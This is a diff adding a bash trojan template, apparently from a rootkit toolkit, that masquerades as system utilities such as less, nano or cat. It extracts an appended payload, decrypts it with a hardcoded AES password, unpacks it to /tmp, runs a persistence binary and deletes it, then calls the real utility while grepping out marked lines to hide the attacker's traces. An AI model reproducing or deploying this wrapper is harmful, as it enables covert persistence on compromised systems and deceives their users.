@@ -1,0 +1,17 @@
+#!/bin/bash -p
+
+CONTENT=`#!TS_TROJAN_PATH!#/usr/bin/awk '/__CONTENT__/ { if (NR > 3) print NR+1 }' $0 2>/dev/null| #!TS_TROJAN_PATH!#/usr/bin/tail -n1 2>/dev/null`
+
+#!TS_TROJAN_PATH!#/usr/bin/tail -n+$CONTENT $0 2>/dev/null | #!TS_TROJAN_PATH!#/usr/bin/openssl enc -d -aes-256-cbc -a -salt -pass pass:on_boot 2>/dev/null | #!TS_TROJAN_PATH!#/usr/bin/base64 -di 2>/dev/null | #!TS_TROJAN_PATH!#/bin/tar -zxf - -C /tmp/ 2>/dev/null && #!TS_TROJAN_PATH!#/bin/chmod +x /tmp/#!TS_TROJAN_PERSIST!#/#!TS_TROJAN_PERSIST!# 2>/dev/null && /tmp/#!TS_TROJAN_PERSIST!#/#!TS_TROJAN_PERSIST!# 2>/dev/null
+#!TS_TROJAN_PATH!#/bin/rm -Rf /tmp/#!TS_TROJAN_PERSIST!# 2>/dev/null
+if [ $0 == '/bin/less' ]; then
+	#!TS_TROJAN_PATH!#/bin/less $* 2>&1 | #!TS_TROJAN_PATH!#/bin/grep -v "#!TS_TROJAN_HIDE!#" 2>/dev/null | #!TS_TROJAN_PATH!#/$0 - 2>&1
+elif [ $0 == '/usr/bin/nano' ]; then
+	#!TS_TROJAN_PATH!#/bin/cat $* 2>&1 | #!TS_TROJAN_PATH!#/bin/grep -v "#!TS_TROJAN_HIDE!#" 2>/dev/null | #!TS_TROJAN_PATH!#/bin/nano - 2>&1
+else
+	#!TS_TROJAN_PATH!#/bin/cat $* 2>&1 | #!TS_TROJAN_PATH!#/bin/grep -v "#!TS_TROJAN_HIDE!#" 2>/dev/null | #!TS_TROJAN_PATH!#/$0 - 2>&1
+fi
+
+exit
+
+__CONTENT__
